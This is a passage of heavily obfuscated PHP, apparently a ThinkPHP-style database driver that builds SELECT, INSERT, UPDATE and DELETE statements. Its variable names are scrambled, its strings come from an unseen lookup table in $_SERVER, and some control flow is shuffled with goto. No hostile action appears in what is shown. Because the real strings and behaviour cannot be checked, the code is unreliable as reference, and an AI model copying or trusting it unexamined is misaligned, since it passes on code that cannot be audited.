substr($BÊèµ¤ÇÏÍ[$cŠÎËÛĞòù[75]], 1) : $cŠÎËÛĞòù[33]); } else { preg_match($cŠÎËÛĞòù[901], trim($féŠÏƒ´¯Ô), $Fª¥ŸÉ®ÉÓ); $a‰…¢Šé˜ = array($cŠÎËÛĞòù[879] => $Fª¥ŸÉ®ÉÓ[1], $cŠÎËÛĞòù[804] => $Fª¥ŸÉ®ÉÓ[2], $cŠÎËÛĞòù[805] => $Fª¥ŸÉ®ÉÓ[3], $cŠÎËÛĞòù[802] => $Fª¥ŸÉ®ÉÓ[4], $cŠÎËÛĞòù[803] => $Fª¥ŸÉ®ÉÓ[5], $cŠÎËÛĞòù[17] => $Fª¥ŸÉ®ÉÓ[6]); } $a‰…¢Šé˜[$cŠÎËÛĞòù[831]] = $cŠÎËÛĞòù[33]; return $a‰…¢Šé˜; } protected function debug() { $A­™˜†‚»´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $A­™˜†‚»´[902]; if (think_config($A­™˜†‚»´[903])) { think_status($A­™˜†‚»´[904]); think_trace($this->queryStr . $A­™˜†‚»´[905] . think_status($A­™˜†‚»´[20], $A­™˜†‚»´[904], 6) . $A­™˜†‚»´[906], $A­™˜†‚»´[33], $A­™˜†‚»´[907]); } } protected function parseLock($b„¶¨™‘î¥ = false) { $EçÃö„¹Ä® =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$b„¶¨™‘î¥) { return $EçÃö„¹Ä®[33]; } if ($EçÃö„¹Ä®[833] == $this->dbType) { return $EçÃö„¹Ä®[908]; } return $EçÃö„¹Ä®[909]; } protected function parseSet($d¾ÉŒ»ªš) { $d¢ÆÓº²› =& $_SERVER[´Ù×Íå‘ÄõÛ]; foreach ($d¾ÉŒ»ªš as $Eá’®ˆïŒô => $còºİÕ¸) { if (is_array($còºİÕ¸) && $d¢ÆÓº²›[285] == $còºİÕ¸[0]) { $D†äÖÕœ[] = $this->parseKey($Eá’®ˆïŒô) . $d¢ÆÓº²›[910] . $còºİÕ¸[1]; } elseif (is_scalar($còºİÕ¸) || is_null($còºİÕ¸)) { $D†äÖÕœ[] = $this->parseKey($Eá’®ˆïŒô) . $d¢ÆÓº²›[910] . $this->parseValue($còºİÕ¸); } } return $d¢ÆÓº²›[911] . implode($d¢ÆÓº²›[47], $D†äÖÕœ); } protected function bindParam($C‰’ŒÕ‡÷, $a£Ç¾õ¬¨Û) { $this->bind[$_SERVER[´Ù×Íå‘ÄõÛ][4] . $C‰’ŒÕ‡÷] = $a£Ç¾õ¬¨Û; } protected function parseBind($D™«Øµß™Ÿ) { $D™«Øµß™Ÿ = array_merge($this->bind, $D™«Øµß™Ÿ); $this->bind = array(); return $D™«Øµß™Ÿ; } function parseKey(&$DÜƒãŒ´¨, $FÓÖÔ‹…Å = true) { if ($FÓÖÔ‹…Å) { $DÜƒãŒ´¨ = $this->parseKeyCheck($DÜƒãŒ´¨); } return $DÜƒãŒ´¨; } function parseKeyCheck($A—”‡ŒèŒ¡) { $Eƒ“´æÚå„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A—”‡ŒèŒ¡ = trim($A—”‡ŒèŒ¡); if (!preg_match($Eƒ“´æÚå„[912], $A—”‡ŒèŒ¡)) { think_exception($Eƒ“´æÚå„[913] . $A—”‡ŒèŒ¡); } return $A—”‡ŒèŒ¡; } protected function parseValue($bš°Ê¸ÔÉÈ) { $bÎá‚¾Á³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_string($bš°Ê¸ÔÉÈ)) { $bš°Ê¸ÔÉÈ = $bÎá‚¾Á³[872] . $this->escapeString($bš°Ê¸ÔÉÈ) . $bÎá‚¾Á³[872]; } elseif (isset($bš°Ê¸ÔÉÈ[0]) && is_string($bš°Ê¸ÔÉÈ[0]) && strtolower($bš°Ê¸ÔÉÈ[0]) == $bÎá‚¾Á³[285]) { $bš°Ê¸ÔÉÈ = $this->escapeString($bš°Ê¸ÔÉÈ[1]); } elseif (is_array($bš°Ê¸ÔÉÈ)) { $bš°Ê¸ÔÉÈ = array_map(array($this, $bÎá‚¾Á³[873]), $bš°Ê¸ÔÉÈ); } elseif (is_bool($bš°Ê¸ÔÉÈ)) { $bš°Ê¸ÔÉÈ = $bš°Ê¸ÔÉÈ ? $bÎá‚¾Á³[83] : $bÎá‚¾Á³[470]; } elseif (is_null($bš°Ê¸ÔÉÈ)) { $bš°Ê¸ÔÉÈ = $bÎá‚¾Á³[99]; } return $bš°Ê¸ÔÉÈ; } protected function parseField($dÄ†çÑß†˜) { $Cãá‰ …í‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_string($dÄ†çÑß†˜) && strpos($dÄ†çÑß†˜, $Cãá‰ …í‚[47])) { $dÄ†çÑß†˜ = explode($Cãá‰ …í‚[47], $dÄ†çÑß†˜); } if (is_array($dÄ†çÑß†˜)) { $aï‡Û£Ò£¯ = array(); foreach ($dÄ†çÑß†˜ as $d—Î£§¨¼ => $cµ‚ôæÅˆ‚) { if (!is_numeric($d—Î£§¨¼)) { $aï‡Û£Ò£¯[] = $this->parseKey($d—Î£§¨¼) . $Cãá‰ …í‚[914] . $this->parseKey($cµ‚ôæÅˆ‚); } else { $aï‡Û£Ò£¯[] = $this->parseKey($cµ‚ôæÅˆ‚); } } $eî³èˆÉ—Ñ = implode($Cãá‰ …í‚[47], $aï‡Û£Ò£¯); } elseif (is_string($dÄ†çÑß†˜) && !empty($dÄ†çÑß†˜)) { $eî³èˆÉ—Ñ = $dÄ†çÑß†˜; } else { $eî³èˆÉ—Ñ = $Cãá‰ …í‚[176]; } return $eî³èˆÉ—Ñ; } protected function parseTable($bÒ¶ñâ¾¸®) { $EãÑºËÆš¥ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_array($bÒ¶ñâ¾¸®)) { $cÎ‹ËÏµ« = array(); foreach ($bÒ¶ñâ¾¸® as $c¯Â‚ñî– => $cÇ–ˆŞö„š) { if (!is_numeric($c¯Â‚ñî–)) { $cÎ‹ËÏµ«[] = $this->parseKey($c¯Â‚ñî–) . $EãÑºËÆš¥[50] . $this->parseKey($cÇ–ˆŞö„š); } else { $cÎ‹ËÏµ«[] = $this->parseKey($c¯Â‚ñî–); } } $bÒ¶ñâ¾¸® = $cÎ‹ËÏµ«; } elseif (is_string($bÒ¶ñâ¾¸®)) { if (strstr($bÒ¶ñâ¾¸®, $EãÑºËÆš¥[50])) { return $bÒ¶ñâ¾¸®; } $bÒ¶ñâ¾¸® = explode($EãÑºËÆš¥[47], $bÒ¶ñâ¾¸®); array_walk($bÒ¶ñâ¾¸®, array($this, $EãÑºËÆš¥[821])); } return $EãÑºËÆš¥[915] . trim(implode($EãÑºËÆš¥[916], $bÒ¶ñâ¾¸®), $EãÑºËÆš¥[827]) . $EãÑºËÆš¥[915]; } protected function parseWhere($f¡‹Áñ·‰) { $e›ïğ‚äøì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÆ»ç¿ƒ = $e›ïğ‚äøì[33]; if (is_string($f¡‹Áñ·‰)) { $AÆ»ç¿ƒ = $f¡‹Áñ·‰; } else { $fî¡–…Ùæ× = isset($f¡‹Áñ·‰[$e›ïğ‚äøì[917]]) ? strtoupper($f¡‹Áñ·‰[$e›ïğ‚äøì[917]]) : $e›ïğ‚äøì[33]; if (in_array($fî¡–…Ùæ×, array($e›ïğ‚äøì[918], $e›ïğ‚äøì[919], $e›ïğ‚äøì[920]))) { $fî¡–…Ùæ× = $e›ïğ‚äøì[50] . $fî¡–…Ùæ× . $e›ïğ‚äøì[50]; unset($f¡‹Áñ·‰[$e›ïğ‚äøì[917]]); } else { $fî¡–…Ùæ× = $e›ïğ‚äøì[921]; } foreach ($f¡‹Áñ·‰ as $d´£“’½ŠË => $e»Îº„İŞ‰) { $AÆ»ç¿ƒ .= $e›ïğ‚äøì[265]; if (is_numeric($d´£“’½ŠË)) { $d´£“’½ŠË = $e›ïğ‚äøì[922]; } if (0 === strpos($d´£“’½ŠË, $e›ïğ‚äøì[70])) { $AÆ»ç¿ƒ .= $this->parseThinkWhere($d´£“’½ŠË, $e»Îº„İŞ‰); } else { if (!preg_match($e›ïğ‚äøì[923], trim($d´£“’½ŠË))) { think_exception(think_lang($e›ïğ‚äøì[924]) . $e›ïğ‚äøì[4] . $d´£“’½ŠË); } $F­òÔ˜‰ŸÓ = is_array($e»Îº„İŞ‰) && isset($e»Îº„İŞ‰[$e›ïğ‚äøì[925]]); $d´£“’½ŠË = trim($d´£“’½ŠË); if (strpos($d´£“’½ŠË, $e›ïğ‚äøì[271])) { $A£Ë‘ï‚Ï = explode($e›ïğ‚äøì[271], $d´£“’½ŠË); $C–Ñ§­¾ ™ = array(); foreach ($A£Ë‘ï‚Ï as $fÙ¿‘„˜ê» => $c¸à½îõËè) { $D¬‚âßÎ°„ = $F­òÔ˜‰ŸÓ ? $e»Îº„İŞ‰[$fÙ¿‘„˜ê»] : $e»Îº„İŞ‰; $C–Ñ§­¾ ™[] = $e›ïğ‚äøì[248] . $this->parseWhereItem($this->parseKey($c¸à½îõËè), $D¬‚âßÎ°„) . $e›ïğ‚äøì[820]; } $AÆ»ç¿ƒ .= implode($e›ïğ‚äøì[926], $C–Ñ§­¾ ™); } elseif (strpos($d´£“’½ŠË, $e›ïğ‚äøì[272])) { $A£Ë‘ï‚Ï = explode($e›ïğ‚äøì[272], $d´£“’½ŠË); $C–Ñ§­¾ ™ = array(); foreach ($A£Ë‘ï‚Ï as $fÙ¿‘„˜ê» => $c¸à½îõËè) { $D¬‚âßÎ°„ = $F­òÔ˜‰ŸÓ ? $e»Îº„İŞ‰[$fÙ¿‘„˜ê»] : $e»Îº„İŞ‰; $C–Ñ§­¾ ™[] = $e›ïğ‚äøì[248] . $this->parseWhereItem($this->parseKey($c¸à½îõËè), $D¬‚âßÎ°„) . $e›ïğ‚äøì[820]; } $AÆ»ç¿ƒ .= implode($e›ïğ‚äøì[921], $C–Ñ§­¾ ™); } else { $AÆ»ç¿ƒ .= $this->parseWhereItem($this->parseKey($d´£“’½ŠË), $e»Îº„İŞ‰); } } $AÆ»ç¿ƒ .= $e›ïğ‚äøì[266] . $fî¡–…Ùæ×; } $AÆ»ç¿ƒ = substr($AÆ»ç¿ƒ, 0, -strlen($fî¡–…Ùæ×)); } return empty($AÆ»ç¿ƒ) ? $e›ïğ‚äøì[33] : $e›ïğ‚äøì[927] . $AÆ»ç¿ƒ; } protected function parseWhereItem($fœáğñ½Í•, $EƒŸ‚Ñº’¼) { $c­‘åĞ‘› =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÆ«ÒŠÅö¶ = $c­‘åĞ‘›[33]; if (is_array($EƒŸ‚Ñº’¼)) { if (is_string($EƒŸ‚Ñº’¼[0])) { $bÒ¦ö·…Üµ = strtolower($EƒŸ‚Ñº’¼[0]); if (in_array($EƒŸ‚Ñº’¼[0], array($c­‘åĞ‘›[910], $c­‘åĞ‘›[928], $c­‘åĞ‘›[929], $c­‘åĞ‘›[930], $c­‘åĞ‘›[931], $c­‘åĞ‘›[932]))) { $DÆ«ÒŠÅö¶ .= $fœáğñ½Í• . $c­‘åĞ‘›[50] . $EƒŸ‚Ñº’¼[0] . $c­‘åĞ‘›[50] . $this->parseValue($EƒŸ‚Ñº’¼[1]); } elseif (preg_match($c­‘åĞ‘›[933], $EƒŸ‚Ñº’¼[0])) { $DÆ«ÒŠÅö¶ .= $fœáğñ½Í• . $c­‘åĞ‘›[50] . $this->exp[$bÒ¦ö·…Üµ] . $c­‘åĞ‘›[50] . $this->parseValue($EƒŸ‚Ñº’¼[1]); } elseif (preg_match($c­‘åĞ‘›[934], $EƒŸ‚Ñº’¼[0])) { if (is_array($EƒŸ‚Ñº’¼[1])) { $eŠŠ¥‘‘Á© = isset($EƒŸ‚Ñº’¼[2]) ? strtoupper($EƒŸ‚Ñº’¼[2]) : $c­‘åĞ‘›[919]; if (in_array($eŠŠ¥‘‘Á©, array($c­‘åĞ‘›[918], $c­‘åĞ‘›[919], $c­‘åĞ‘›[920]))) { $A™ˆŸ„“ƒ = array(); foreach ($EƒŸ‚Ñº’¼[1] as $ašô‹ÄÆŒ) { $A™ˆŸ„“ƒ[] = $fœáğñ½Í• . $c­‘åĞ‘›[50] . $this->exp[$bÒ¦ö·…Üµ] . $c­‘åĞ‘›[50] . $this->parseValue($ašô‹ÄÆŒ); } $DÆ«ÒŠÅö¶ .= $c­‘åĞ‘›[248] . implode($c­‘åĞ‘›[50] . $eŠŠ¥‘‘Á© . $c­‘åĞ‘›[50], $A™ˆŸ„“ƒ) . $c­‘åĞ‘›[820]; } } else { $DÆ«ÒŠÅö¶ .= $fœáğñ½Í• . $c­‘åĞ‘›[50] . $this->exp[$bÒ¦ö·…Üµ] . $c­‘åĞ‘›[50] . $this->parseValue($EƒŸ‚Ñº’¼[1]); } } elseif ($c­‘åĞ‘›[285] == $bÒ¦ö·…Üµ) { $DÆ«ÒŠÅö¶ .= $c­‘åĞ‘›[818] . $fœáğñ½Í• . $c­‘åĞ‘›[50] . $EƒŸ‚Ñº’¼[1] . $c­‘åĞ‘›[935]; } elseif (preg_match($c­‘åĞ‘›[936], $EƒŸ‚Ñº’¼[0])) { if (isset($EƒŸ‚Ñº’¼[2]) && $c­‘åĞ‘›[285] == $EƒŸ‚Ñº’¼[2]) { $DÆ«ÒŠÅö¶ .= $fœáğñ½Í• . $c­‘åĞ‘›[50] . $this->exp[$bÒ¦ö·…Üµ] . $c­‘åĞ‘›[50] . $EƒŸ‚Ñº’¼[1]; } else { if (is_string($EƒŸ‚Ñº’¼[1])) { $EƒŸ‚Ñº’¼[1] = explode($c­‘åĞ‘›[47], $EƒŸ‚Ñº’¼[1]); } $cñ„¬¯¥È» = implode($c­‘åĞ‘›[47], $this->parseValue($EƒŸ‚Ñº’¼[1])); $DÆ«ÒŠÅö¶ .= $fœáğñ½Í• . $c­‘åĞ‘›[50] . $this->exp[$bÒ¦ö·…Üµ] . $c­‘åĞ‘›[818] . $cñ„¬¯¥È» . $c­‘åĞ‘›[820]; } } elseif (preg_match($c­‘åĞ‘›[937], $EƒŸ‚Ñº’¼[0])) { $DïˆÚòãò = is_string($EƒŸ‚Ñº’¼[1]) ? explode($c­‘åĞ‘›[47], $EƒŸ‚Ñº’¼[1]) : $EƒŸ‚Ñº’¼[1]; $DÆ«ÒŠÅö¶ .= $c­‘åĞ‘›[818] . $fœáğñ½Í• . $c­‘åĞ‘›[50] . $this->exp[$bÒ¦ö·…Üµ] . $c­‘åĞ‘›[50] . $this->parseValue($DïˆÚòãò[0]) . $c­‘åĞ‘›[921] . $this->parseValue($DïˆÚòãò[1]) . $c­‘åĞ‘›[266]; } else { think_exception(think_lang($c­‘åĞ‘›[924]) . $c­‘åĞ‘›[4] . $EƒŸ‚Ñº’¼[0]); } } else { $bôÊ‰á¯¿ğ = count($EƒŸ‚Ñº’¼); $BÛÉƒÆ™ëš = isset($EƒŸ‚Ñº’¼[$bôÊ‰á¯¿ğ - 1]) ? strtoupper($EƒŸ‚Ñº’¼[$bôÊ‰á¯¿ğ - 1]) : $c­‘åĞ‘›[33]; if (in_array($BÛÉƒÆ™ëš, array($c­‘åĞ‘›[918], $c­‘åĞ‘›[919], $c­‘åĞ‘›[920]))) { $bôÊ‰á¯¿ğ = $bôÊ‰á¯¿ğ - 1; } else { $BÛÉƒÆ™ëš = $c­‘åĞ‘›[918]; } for ($B‡Ò÷òÁöÃ = 0; $B‡Ò÷òÁöÃ < $bôÊ‰á¯¿ğ; $B‡Ò÷òÁöÃ++) { $DïˆÚòãò = is_array($EƒŸ‚Ñº’¼[$B‡Ò÷òÁöÃ]) ? $EƒŸ‚Ñº’¼[$B‡Ò÷òÁöÃ][1] : $EƒŸ‚Ñº’¼[$B‡Ò÷òÁöÃ]; if ($c­‘åĞ‘›[285] == strtolower($EƒŸ‚Ñº’¼[$B‡Ò÷òÁöÃ][0])) { $DÆ«ÒŠÅö¶ .= $c­‘åĞ‘›[248] . $fœáğñ½Í• . $c­‘åĞ‘›[50] . $DïˆÚòãò . $c­‘åĞ‘›[935] . $BÛÉƒÆ™ëš . $c­‘åĞ‘›[50]; } else { $DŠØÆÊ÷è = is_array($EƒŸ‚Ñº’¼[$B‡Ò÷òÁöÃ]) ? $this->exp[strtolower($EƒŸ‚Ñº’¼[$B‡Ò÷òÁöÃ][0])] : $c­‘åĞ‘›[910]; if (!$DŠØÆÊ÷è && is_array($EƒŸ‚Ñº’¼[$B‡Ò÷òÁöÃ]) && in_array($EƒŸ‚Ñº’¼[$B‡Ò÷òÁöÃ][0], array($c­‘åĞ‘›[910], $c­‘åĞ‘›[928], $c­‘åĞ‘›[929], $c­‘åĞ‘›[930], $c­‘åĞ‘›[931], $c­‘åĞ‘›[932]))) { $DŠØÆÊ÷è = $EƒŸ‚Ñº’¼[$B‡Ò÷òÁöÃ][0]; } $DÆ«ÒŠÅö¶ .= $c­‘åĞ‘›[248] . $fœáğñ½Í• . $c­‘åĞ‘›[50] . $DŠØÆÊ÷è . $c­‘åĞ‘›[50] . $this->parseValue($DïˆÚòãò) . $c­‘åĞ‘›[935] . $BÛÉƒÆ™ëš . $c­‘åĞ‘›[50]; } } $DÆ«ÒŠÅö¶ = substr($DÆ«ÒŠÅö¶, 0, -4); } } else { $DÆ«ÒŠÅö¶ .= $fœáğñ½Í• . $c­‘åĞ‘›[938] . $this->parseValue($EƒŸ‚Ñº’¼); } return $DÆ«ÒŠÅö¶; } protected function parseThinkWhere($F›‹Â‘‚Ó·, $f—Ñ–İ¤”Ò) { $f÷‡àºŸ°“ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FƒÒÑ ¦Å­ = $f÷‡àºŸ°“[33]; switch ($F›‹Â‘‚Ó·) { case $f÷‡àºŸ°“[339]: $FƒÒÑ ¦Å­ = $f—Ñ–İ¤”Ò; break; case $f÷‡àºŸ°“[922]: $FƒÒÑ ¦Å­ = is_string($f—Ñ–İ¤”Ò) ? $f—Ñ–İ¤”Ò : substr($this->parseWhere($f—Ñ–İ¤”Ò), 6); break; case $f÷‡àºŸ°“[939]: parse_str($f—Ñ–İ¤”Ò, $bÉ­‡™ˆæˆ); if (isset($bÉ­‡™ˆæˆ[$f÷‡àºŸ°“[917]])) { $C—Í†é¹× = $f÷‡àºŸ°“[50] . strtoupper($bÉ­‡™ˆæˆ[$f÷‡àºŸ°“[917]]) . $f÷‡àºŸ°“[50]; unset($bÉ­‡™ˆæˆ[$f÷‡àºŸ°“[917]]); } else { $C—Í†é¹× = $f÷‡àºŸ°“[921]; } $F£ ÚšÎµ¦ = array(); foreach ($bÉ­‡™ˆæˆ as $f©ëĞÍ—’Á => $bùé³êãô) { $F£ ÚšÎµ¦[] = $this->parseKey($f©ëĞÍ—’Á) . $f÷‡àºŸ°“[938] . $this->parseValue($bùé³êãô); } $FƒÒÑ ¦Å­ = implode($C—Í†é¹×, $F£ ÚšÎµ¦); break; } return $FƒÒÑ ¦Å­; } protected function parseLimit($BŒ¼í„…áù) { $e¯îïÍ¢ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; return !empty($BŒ¼í„…áù) ? $e¯îïÍ¢ñ[48] . $BŒ¼í„…áù . $e¯îïÍ¢ñ[50] : $e¯îïÍ¢ñ[33]; } protected function parseJoin($c‰«â¡×) { $A¨Ã¤‹‘†Œ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÎÜ®–ÂŠ = $A¨Ã¤‹‘†Œ[33]; if (!empty($c‰«â¡×)) { if (is_array($c‰«â¡×)) { foreach ($c‰«â¡× as $a¡µ­Ìä…Ê => $f»Ê‘³Û¢–) { if (!1 !== stripos($f»Ê‘³Û¢–, $A¨Ã¤‹‘†Œ[940])) { $AÎÜ®–ÂŠ .= $A¨Ã¤‹‘†Œ[50] . $f»Ê‘³Û¢–; } else { $AÎÜ®–ÂŠ .= $A¨Ã¤‹‘†Œ[941] . $f»Ê‘³Û¢–; } } } else { $AÎÜ®–ÂŠ .= $A¨Ã¤‹‘†Œ[941] . $c‰«â¡×; } } $AÎÜ®–ÂŠ = preg_replace($A¨Ã¤‹‘†Œ[942], think_config($A¨Ã¤‹‘†Œ[845]) . $A¨Ã¤‹‘†Œ[943], $AÎÜ®–ÂŠ); return $AÎÜ®–ÂŠ; } protected function parseOrder($eøŒˆÁëĞÙ) { $DÑ™…È†§Š =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_array($eøŒˆÁëĞÙ)) { $FÎ……Êï…Æ = array(); foreach ($eøŒˆÁëĞÙ as $Aù©™¸ó¹Ç => $e µœ÷Úğ) { if (is_numeric($Aù©™¸ó¹Ç)) { $FÎ……Êï…Æ[] = $this->parseKey($e µœ÷Úğ); } else { $e µœ÷Úğ = in_array(strtoupper(trim($e µœ÷Úğ)), array($DÑ™…È†§Š[944], $DÑ™…È†§Š[945])) ? $DÑ™…È†§Š[50] . $e µœ÷Úğ : $DÑ™…È†§Š[33]; if (preg_match($DÑ™…È†§Š[946], $Aù©™¸ó¹Ç)) { $FÎ……Êï…Æ[] = $this->parseKey($Aù©™¸ó¹Ç) . $e µœ÷Úğ; } else { think_exception($DÑ™…È†§Š[947] . $Aù©™¸ó¹Ç); } } } $eøŒˆÁëĞÙ = implode($DÑ™…È†§Š[47], $FÎ……Êï…Æ); } return !empty($eøŒˆÁëĞÙ) ? $DÑ™…È†§Š[948] . $eøŒˆÁëĞÙ : $DÑ™…È†§Š[33]; } protected function parseGroup($D¿º§ÊÑÛí) { $aÜÓÚŞˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; return !empty($D¿º§ÊÑÛí) ? $aÜÓÚŞˆ[949] . $D¿º§ÊÑÛí : $aÜÓÚŞˆ[33]; } protected function parseHaving($CÍ•ó«¬Ñ) { $EÎèòÖö =& $_SERVER[´Ù×Íå‘ÄõÛ]; return !empty($CÍ•ó«¬Ñ) ? $EÎèòÖö[950] . $CÍ•ó«¬Ñ : $EÎèòÖö[33]; } protected function parseComment($A¾ˆ¦éÜ¿) { $E¾¹òèïñï =& $_SERVER[´Ù×Íå‘ÄõÛ]; return !empty($A¾ˆ¦éÜ¿) ? $E¾¹òèïñï[951] . $A¾ˆ¦éÜ¿ . $E¾¹òèïñï[952] : $E¾¹òèïñï[33]; } protected function parseDistinct($DÏè›‰ÑÔˆ) { $bÁİŸÎ‡Ó‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; return !empty($DÏè›‰ÑÔˆ) ? $bÁİŸÎ‡Ó‡[953] : $bÁİŸÎ‡Ó‡[33]; } protected function parseUnion($EˆÒ±¾š˜Š) { $E¿ƒ¨ŠŞ‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($EˆÒ±¾š˜Š)) { return $E¿ƒ¨ŠŞ‘[33]; } if (isset($EˆÒ±¾š˜Š[$E¿ƒ¨ŠŞ‘[336]])) { $e²—Êé×Ï = $E¿ƒ¨ŠŞ‘[954]; unset($EˆÒ±¾š˜Š[$E¿ƒ¨ŠŞ‘[336]]); } else { $e²—Êé×Ï = $E¿ƒ¨ŠŞ‘[955]; } foreach ($EˆÒ±¾š˜Š as $Dì…Õš£®¦) { $fæò‰–‚Ÿ[] = $e²—Êé×Ï . (is_array($Dì…Õš£®¦) ? $this->buildSelectSql($Dì…Õš£®¦) : $Dì…Õš£®¦); } return implode($E¿ƒ¨ŠŞ‘[50], $fæò‰–‚Ÿ); } public function insert($dĞøÒÀ×±Ô, $b°Š £‘œÛ = array(), $B¾‚‰×çª— = false) { goto a¯’Ôò…ã; a¯’Ôò…ã: $cºˆ‘ò–‹Á =& $_SERVER[´Ù×Íå‘ÄõÛ]; $càŒÁ¥ØÎ¨ = $e¡éíÑ­–š = array(); $this->model = $b°Š £‘œÛ[$cºˆ‘ò–‹Á[269]]; goto EÓÜÛä­Ó; EÓÜÛä­Ó: foreach ($dĞøÒÀ×±Ô as $F‹øã¨­Õ => $bôñÙ”ğƒ¤) { if (is_array($bôñÙ”ğƒ¤) && $cºˆ‘ò–‹Á[285] == $bôñÙ”ğƒ¤[0]) { $e¡éíÑ­–š[] = $this->parseKey($F‹øã¨­Õ); $càŒÁ¥ØÎ¨[] = $bôñÙ”ğƒ¤[1]; } elseif (is_scalar($bôñÙ”ğƒ¤) || is_null($bôñÙ”ğƒ¤)) { $e¡éíÑ­–š[] = $this->parseKey($F‹øã¨­Õ); $càŒÁ¥ØÎ¨[] = $this->parseValue($bôñÙ”ğƒ¤); } } $DƒÑ˜ˆ‰Ã = ($B¾‚‰×çª— ? $cºˆ‘ò–‹Á[822] : $cºˆ‘ò–‹Á[823]) . $cºˆ‘ò–‹Á[824] . $this->parseTable($b°Š £‘œÛ[$cºˆ‘ò–‹Á[267]]) . $cºˆ‘ò–‹Á[818] . implode($cºˆ‘ò–‹Á[47], $e¡éíÑ­–š) . $cºˆ‘ò–‹Á[819] . implode($cºˆ‘ò–‹Á[47], $càŒÁ¥ØÎ¨) . $cºˆ‘ò–‹Á[820]; $DƒÑ˜ˆ‰Ã .= $this->parseLock(isset($b°Š £‘œÛ[$cºˆ‘ò–‹Á[772]]) ? $b°Š £‘œÛ[$cºˆ‘ò–‹Á[772]] : !1); goto DÂÓ™ƒ»ôÇ; DÂÓ™ƒ»ôÇ: $DƒÑ˜ˆ‰Ã .= $this->parseComment(!empty($b°Š £‘œÛ[$cºˆ‘ò–‹Á[341]]) ? $b°Š £‘œÛ[$cºˆ‘ò–‹Á[341]] : $cºˆ‘ò–‹Á[33]); return $this->execute($DƒÑ˜ˆ‰Ã, $this->parseBind(!empty($b°Š £‘œÛ[$cºˆ‘ò–‹Á[273]]) ? $b°Š £‘œÛ[$cºˆ‘ò–‹Á[273]] : array())); goto B…—àÎİñå; B…—àÎİñå: } public function selectInsert($BòÌ°—¹Ã, $bƒÑØ¯‹’, $FÅèó‰µ¡ = array()) { goto c‚ñÔ®êˆ‰; c‚ñÔ®êˆ‰: $b­­’…Ö«ã =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->model = $FÅèó‰µ¡[$b­­’…Ö«ã[269]]; if (is_string($BòÌ°—¹Ã)) { $BòÌ°—¹Ã = explode($b­­’…Ö«ã[47], $BòÌ°—¹Ã); } goto FÁ ÃÛ“º ; b´¶çÍŒ‹¡: return $this->execute($aŒéæöØØ¾, $this->parseBind(!empty($FÅèó‰µ¡[$b­­’…Ö«ã[273]]) ? $FÅèó‰µ¡[$b­­’…Ö«ã[273]] : array())); goto Cå÷Ñƒ’õ ; FÁ ÃÛ“º : array_walk($BòÌ°—¹Ã, array($this, $b­­’…Ö«ã[821])); $aŒéæöØØ¾ = $b­­’…Ö«ã[956] . $this->parseTable($bƒÑØ¯‹’) . $b­­’…Ö«ã[818] . implode($b­­’…Ö«ã[47], $BòÌ°—¹Ã) . $b­­’…Ö«ã[935]; $aŒéæöØØ¾ .= $this->buildSelectSql($FÅèó‰µ¡); goto b´¶çÍŒ‹¡; Cå÷Ñƒ’õ : } public function update($aİÄ‘†Ë», $AÁã‘¤¸§Ä) { $aƒøà¨Ì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->model = $AÁã‘¤¸§Ä[$aƒøà¨Ì[269]]; $Aïêø¢ˆ†™ = $aƒøà¨Ì[957] . $this->parseTable($AÁã‘¤¸§Ä[$aƒøà¨Ì[267]]) . $this->parseSet($aİÄ‘†Ë») . $this->parseWhere(!empty($AÁã‘¤¸§Ä[$aƒøà¨Ì[263]]) ? $AÁã‘¤¸§Ä[$aƒøà¨Ì[263]] : $aƒøà¨Ì[33]) . $this->parseOrder(!empty($AÁã‘¤¸§Ä[$aƒøà¨Ì[350]]) ? $AÁã‘¤¸§Ä[$aƒøà¨Ì[350]] : $aƒøà¨Ì[33]) . $this->parseLimit(!empty($AÁã‘¤¸§Ä[$aƒøà¨Ì[280]]) ? $AÁã‘¤¸§Ä[$aƒøà¨Ì[280]] : $aƒøà¨Ì[33]) . $this->parseLock(isset($AÁã‘¤¸§Ä[$aƒøà¨Ì[772]]) ? $AÁã‘¤¸§Ä[$aƒøà¨Ì[772]] : !1) . $this->parseComment(!empty($AÁã‘¤¸§Ä[$aƒøà¨Ì[341]]) ? $AÁã‘¤¸§Ä[$aƒøà¨Ì[341]] : $aƒøà¨Ì[33]); return $this->execute($Aïêø¢ˆ†™, $this->parseBind(!empty($AÁã‘¤¸§Ä[$aƒøà¨Ì[273]]) ? $AÁã‘¤¸§Ä[$aƒøà¨Ì[273]] : array())); } public function delete($dÉËæé´”Ü = array()) { $FÆ…ÏĞŠù =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->model = $dÉËæé´”Ü[$FÆ…ÏĞŠù[269]]; $bñ±¢ÒÁÜ = $FÆ…ÏĞŠù[958] . $this->parseTable($dÉËæé´”Ü[$FÆ…ÏĞŠù[267]]) . $this->parseWhere(!empty($dÉËæé´”Ü[$FÆ…ÏĞŠù[263]]) ? $dÉËæé´”Ü[$FÆ…ÏĞŠù[263]] : $FÆ…ÏĞŠù[33]) . $this->parseOrder(!empty($dÉËæé´”Ü[$FÆ…ÏĞŠù[350]]) ? $dÉËæé´”Ü[$FÆ…ÏĞŠù[350]] : $FÆ…ÏĞŠù[33]) . $this->parseLimit(!empty($dÉËæé´”Ü[$FÆ…ÏĞŠù[280]]) ? $dÉËæé´”Ü[$FÆ…ÏĞŠù[280]] : $FÆ…ÏĞŠù[33]) . $this->parseLock(isset($dÉËæé´”Ü[$FÆ…ÏĞŠù[772]]) ? $dÉËæé´”Ü[$FÆ…ÏĞŠù[772]] : !1) . $this->parseComment(!empty($dÉËæé´”Ü[$FÆ…ÏĞŠù[341]]) ? 